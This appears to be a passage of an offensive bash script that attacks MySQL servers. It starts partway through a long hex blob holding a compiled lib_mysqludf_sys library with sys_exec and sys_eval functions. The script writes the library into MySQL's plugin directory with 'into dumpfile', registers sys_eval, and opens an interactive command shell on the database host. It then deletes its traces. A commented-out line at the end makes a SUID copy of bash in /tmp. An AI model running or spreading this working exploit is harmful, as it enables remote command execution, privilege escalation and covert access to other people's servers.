b108b450c8b400883c0048b0089542408894424048b45f8890424e8fcffffff8b450c8b400c83c0048b000345f8c60000c7442408010000008b45f8894424048b45fc890424e8fcffffff89c2c1fa1fc9c35589e583ec28c745fc000000008b450c8b0083f801751b8b450c8b50048b45fcc1e0028d04028b0085c07506c645ef00eb1fc74424082b000000c7442404280f00008b4510890424e8fcffffffc645ef010fb645efc9c35589e55dc35589e583ec088b450c8b40088b00890424e8fcffffff89c2c1fa1fc9c35589e583ec28c745fc000000008b450c8b0083f801751b8b450c8b50048b45fcc1e0028d04028b0085c07506c645ef00eb1fc74424082b000000c7442404280f00008b4510890424e8fcffffffc645ef010fb645efc9c35589e55dc35589e581ec380400008b45088985ecfbffff8b450c8985e8fbffff8b45108985e4fbffff8b45148985e0fbffff8b45188985dcfbffff8b451c8985d8fbffff65a1140000008945fc31c0c7042401000000e8fcffffff8985e4fbffffc785f4fbffff000000008b85e8fbffff8b40088b00c7442404b60f0000890424e8fcffffff8985f8fbffffeb718d85fcfbffff890424e8fcffffff8985f0fbffff8b95f0fbffff8b85f4fbffff01d0894424048b85e4fbffff890424e8fcffffff8985e4fbffff8b95f4fbffff8b85e4fbffff8d14108b85f0fbffff894424088d85fcfbffff89442404891424e8fcffffff8b85f0fbffff0185f4fbffff8b85f8fbffff89442408c7442404000400008d85fcfbffff890424e8fcffffff85c00f8567ffffff8b85f8fbffff890424e8fcffffff8b85e4fbffff0fb60084c0740983bde4fbffff00750b8b85dcfbffffc60001eb298b95f4fbffff8b85e4fbffff01d0c600008b85e4fbffff890424e8fcffffff89c28b85e0fbffff89108b85e4fbffff8b55fc653315140000007405e8fcffffffc9c3909090905589e55653e8edfaffff81c36a1100008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c330110000e8f0f9ffff595bc9c34e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e33000045787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d65746572000045787065637465642065786163746c792074776f20617267756d656e74730000457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f727900720000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff00000000ffffffff000000000000000001000000800100000c000000600800000d000000b80e000004000000d4000000f5feff6fb401000005000000b804000006000000680200000a000000cc0100000b0000001000000003000000f41f00000200000010000000140000001100000017000000500800001100000020070000120000003001000013000000080000001600000000000000feffff6fd0060000ffffff6f01000000f0ffff6f84060000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000181f00000000000000000000a6080000b608000008200000004743433a20285562756e747520342e332e322d317562756e747531312920342e332e3200004743433a20285562756e747520342e332e322d317562756e747531312920342e332e3200004743433a20285562756e747520342e332e322d317562756e747531312920342e332e3200004743433a20285562756e747520342e332e322d317562756e747531312920342e332e3200004743433a20285562756e747520342e332e322d317562756e747531312920342e332e3200000000240000000200000000000400000000006008000022000000b80e0000130000000000000000000000240000000200a50000000400000000008c08000004000000d00e0000040000000000000000000000a1000000020000000000040100000000000000002f6275696c642f6275696c64642f676c6962632d322e387e32303038303530352f6275696c642d747265652f693338362d6c6962632f6373752f637274692e53002f6275696c642f6275696c64642f676c6962632d322e387e32303038303530352f6275696c642d747265652f676c6962632d32303038303530352f63737500474e5520415320322e31382e3933000180700000000200120000000401b3000000200000002f746d702f636351316a5079482e73002f6275696c642f6275696c64642f676c6962632d322e387e32303038303530352f6275696c642d747265652f676c6962632d32303038303530352f63737500474e5520415320322e31382e39330001800111001006550603081b08250813050000000111001006550603081b0825081305000000af0000000200780000000101fb0e0d0001010101000000010000012f6275696c642f6275696c64642f676c6962632d322e387e32303038303530352f6275696c642d747265652f693338362d6c6962632f637375002e2e2f737973646570732f67656e657269630000637274692e5300010000696e697466696e692e63000200000000050260080000030e01212f213d5a2167672f2f02050001010402000502b80e000003ec0001212f213d5a210206000101500000000200260000000101fb0e0d0001010101000000010000012f746d700000636351316a5079482e7300010000000005028c080000031f012121210201000101000502d00e0000032d01212121020100010100000000ffffffff000000006008000082080000b80e0000cb0e00000000000000000000ffffffff000000008c08000090080000d00e0000d40e00000000000000000000002e73796d746162002e737472746162002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e74002e64656275675f6172616e676573002e64656275675f696e666f002e64656275675f616262726576002e64656275675f6c696e65002e64656275675f72616e67657300000000000000000000000000000000000000000000000000000000000000000000000000000000001f0000000500000002000000d4000000d4000000e0000000030000000000000004000000040000001b000000f6ffff6f02000000b4010000b4010000b400000003000000000000000400000004000000250000000b00000002000000680200006802000050020000040000000100000004000000100000002d0000000300000002000000b8040000b8040000cc0100000000000000000000010000000000000035000000ffffff6f0200000084060000840600004a0000000300000000000000020000000200000042000000feffff6f02000000d0060000d00600005000000004000000010000000400000000000000510000000900000002000000200700002007000030010000030000000000000004000000080000005a0000000900000002000000500800005008000010000000030000000a0000000400000008000000630000000100000006000000600800006008000030000000000000000000000004000000000000005e000000010000000600000090080000900800003000000000000000000000000400000004000000690000000100000006000000c0080000c0080000f8050000000000000000000010000000000000006f0000000100000006000000b80e0000b80e00001c00000000000000000000000400000000000000750000000100000002000000d40e0000d40e0000e4000000000000000000000004000000000000007d0000000100000002000000b80f0000b80f00000400000000000000000000000400000000000000870000000100000003000000041f0000041f000008000000000000000000000004000000000000008e00000001000000030000000c1f00000c1f00000800000000000000000000000400000000000000950000000100000003000000141f0000141f000004000000000000000000000004000000000000009a0000000600000003000000181f0000181f0000d000000004000000000000000400000008000000a30000000100000003000000e81f0000e81f00000c00000000000000000000000400000004000000a80000000100000003000000f41f0000f41f00001400000000000000000000000400000004000000b1000000010000000300000008200000082000000400000000000000000000000400000000000000b700000008000000030000000c2000000c2000000800000000000000000000000400000000000000bc0000000100000000000000000000000c200000b900000000000000000000000100000000000000c5000000010000000000000000000000c82000005000000000000000000000000800000000000000d4000000010000000000000000000000182100001901000000000000000000000100000000000000e0000000010000000000000000000000312200002400000000000000000000000100000000000000ee000000010000000000000000000000552200000701000000000000000000000100000000000000fa00000001000000000000000000000060230000400000000000000000000000080000000000000011000000030000000000000000000000a0230000080100000000000000000000010000000000000001000000020000000000000000000000a8290000600500001f00000032000000040000001000000009000000030000000000000000000000082f000058030000000000000000000001000000000000000000000000000000000000000000000000000000d4000000000000000300010000000000b401000000000000030002000000000068020000000000000300030000000000b804000000000000030004000000000084060000000000000300050000000000d0060000000000000300060000000000200700000000000003000700000000005008000000000000030008000000000060080000000000000300090000000000900800000000000003000a0000000000c00800000000000003000b0000000000b80e00000000000003000c0000000000d40e00000000000003000d0000000000b80f00000000000003000e0000000000041f00000000000003000f00000000000c1f0000000000000300100000000000141f0000000000000300110000000000181f0000000000000300120000000000e81f0000000000000300130000000000f41f0000000000000300140000000000082000000000000003001500000000000c200000000000000300160000000000000000000000000003001700000000000000000000000000030018000000000000000000000000000300190000000000000000000000000003001a0000000000000000000000000003001b0000000000000000000000000003001c000100000000000000000000000400f1ff0c00000000000000000000000400f1ff17000000041f00000000000001000f00250000000c1f0000000000000100100033000000141f0000000000000100110040000000c00800000000000002000b00560000000c20000001000000010016006500000010200000040000000100160073000000400900000000000002000b000c00000000000000000000000400f1ff7f000000081f00000000000001000f008c000000b80f00000000000001000e009a000000141f00000000000001001100a6000000800e00000000000002000b000100000000000000000000000400f1ffbc00000000000000000000000400f1ffcf000000f41f0000000000000102f1ffe5000000082000000000000001021500f2000000101f00000000000001021000ff000000770900000000000002020b0016010000181f0000000000000102f1ff1f010000680b0000ac00000012000b002701000000000000000000001200000038010000700c00001d00000012000b004101000000000000000000002000000050010000000000000000000020000000640100000000000000000000120000007701000000000000000000001200000089010000b80e00000000000012000c008f010000000000000000000012000000a1010000000000000000000012000000b4010000e40c00000500000012000b00c4010000000000000000000012000000d5010000140c00005700000012000b00e3010000e90c00009301000012000b00ec010000b60900000500000012000b00090200007a0a0000ce00000012000b0016020000000000000000000012000000260200007c0900003a00000012000b0041020000480b00002000000012000b00500200000000000000000000120000006202000000000000000000001200000074020000ea0900004d00000012000b0081020000370a00000500000012000b00900200008d0c00005700000012000b009e0200003c0a00003e00000012000b00a60200000c200000000000001000f1ffb2020000000000000000000012000000c4020000bb0900002f00000012000b00da020000000000000000000012000000f602000014200000000000001000f1fffb0200006b0c00000500000012000b000b0300000c200000000000001000f1ff120300000000000000000000220000002e030000000000000000000012000000400300000000000000000000120000005203000060080000000000001200090000696e697466696e692e630063727473747566662e63005f5f43544f525f4c4953545f5f005f5f44544f525f4c4953545f5f005f5f4a43525f4c4953545f5f005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e363632350064746f725f6964782e36363237006672616d655f64756d6d79005f5f43544f525f454e445f5f005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f646f5f676c6f62616c5f63746f72735f617578006c69625f6d7973716c7564665f7379732e63005f474c4f42414c5f4f46465345545f5441424c455f005f5f64736f5f68616e646c65005f5f44544f525f454e445f5f005f5f693638362e6765745f70635f7468756e6b2e6278005f44594e414d4943007379735f73657400706f70656e4040474c4942435f322e31007379735f65786563005f5f676d6f6e5f73746172745f5f005f4a765f5265676973746572436c6173736573007265616c6c6f634040474c4942435f322e3000676574656e764040474c4942435f322e30005f66696e690073797374656d4040474c4942435f322e30007374726e6370794040474c4942435f322e30007379735f6576616c5f6465696e69740066676574734040474c4942435f322e30007379735f657865635f696e6974007379735f6576616c006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f7365745f696e697400667265654040474c4942435f322e30006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f7365745f6465696e6974006d656d6370794040474c4942435f322e30007374726c656e4040474c4942435f322e30007379735f6765745f696e6974007379735f6765745f6465696e6974007379735f6576616c5f696e6974007379735f676574005f5f6273735f7374617274006d616c6c6f634040474c4942435f322e30006c69625f6d7973716c7564665f7379735f696e666f005f5f737461636b5f63686b5f6661696c4040474c4942435f322e34005f656e64007379735f657865635f6465696e6974005f6564617461005f5f6378615f66696e616c697a654040474c4942435f322e312e3300736574656e764040474c4942435f322e300070636c6f73654040474c4942435f322e31005f696e697400"


#uname=$(uname -a)
#if [[ $uname == *"x86_64"* ]]
#then
#	shellcode=$shellcode_x64
#else
#	shellcode=$shellcode_x32

#create udf file

function cleanup () {
	table_name=$1
	tmp_udf=$2
	#echo "[*] Running Cleanup..."
	if [[ $table_name != "" ]]
	then
		output=$((mysql -E --user=$username --password=$password --host=$host -e "use mysql;drop table $table_name")2>&1)
		if [[ $output == "" ]]
		then
			echo "[+] Table $table_name successfully removed"
		else
			echo "Unable to remove table: $table_name"
			echo "$output"
		fi
	fi
	output=$((rm $tmp_udf)2>&1)
	if [[ $output == "" ]]
	then
		echo "[+] $tmp_udf successfully removed"
	else
		echo "Unable to remove temp udf file: $tmp_udf"
		echo "$output"
	fi
}

udf_name=$RANDOM.so
output=$((echo $shellcode | xxd -p -r > /tmp/$udf_name)2>&1)
tmp_udf="/tmp/$udf_name"
if [ -f $tmp_udf ]
then
	echo "[+] Successfully created a temp UDF file: $tmp_udf"
else
	echo "[-] Unable to create a temp UDF file: $tmp_udf"
	exit
fi
output=$((mysql -E --user=$username --password=$password --host=$host -e "select @@plugin_dir;")2>&1)
if [[ $output == *"Unknown"* ]]
then
	echo "[!] The plugin directory is not set, trying default directory /usr/lib/"
	plugin_dir="/usr/lib/"
else
	plugin_dir=$(echo "$output" | sed -n 2p | cut -d " " -f2)
fi

udf_save_file="$plugin_dir$udf_name"

#output=$((mysql -E --user=$username --password=$password --host=$host -e "select binary 0x\"$shellcode\" into dumpfile $udf_save_file;")2>&1)

table_name=$(tr -dc A-Za-z </dev/urandom | head -c 13 ; echo '')

echo "[*] Trying to create table: $table_name"
echo "[*] Trying to create UDF file in the plugin folder: $udf_save_file"

output=$((mysql -E --user=$username --password=$password --host=$host -e "use mysql;create table $table_name(line blob);insert into $table_name values(load_file('/tmp/$udf_name'));select * from $table_name into dumpfile '$udf_save_file';")2>&1)

if [[ $output == *"already exists" ]]
then
	echo "[-] Table name already exists!"
	cleanup '' $udf_save_file
	exit
fi

if [ -f "$udf_save_file" ]
then
	echo "[+] UDF Created --> $udf_save_file exists."
else
	echo "[-] Unable to create UDF file"
	echo "$output"
	cleanup '' $udf_save_file
	exit
fi

output=$((mysql -E --user=$username --password=$password --host=$host -e "create function sys_eval returns string soname '$udf_name';")2>&1)

if [[ $output == *"Can't find function"* ]]
then
	echo "[-] Unable to create the sys_eval function from the udf - Do you have user-defined function creation privileges?"
	echo "$output"
	exit
fi

if [[ $output == *"already exists"* ]]
then
	echo "[*] Function already exists! Looks like you aren't alone!! Continuing..."
else
	echo "[+] Shell function successfully created!"
fi

cmd_input=""
echo "[*] Entering a psuedo shell - type 'exit' to quit"
while [[ $cmd_input != "exit" ]]
do
	read -p "cmd> " cmd_input
	if [[ $cmd_input == exit ]]
	then
		echo "^punt!"
		echo "[*] Running Cleaning on table: $table_name, Temp-UDF: $tmp_udf"
		cleanup $table_name $tmp_udf
		exit
	fi
	output=$((mysql --user=$username --password=$password --host=$host -e "select sys_eval('$cmd_input');")2>&1)
	printf "$output\n"
done
# suid binary shell
#r=$RANDOM;cp /bin/bash /tmp/$r && chmod +s /tmp/$r; echo "shell: /tmp/$r -p"
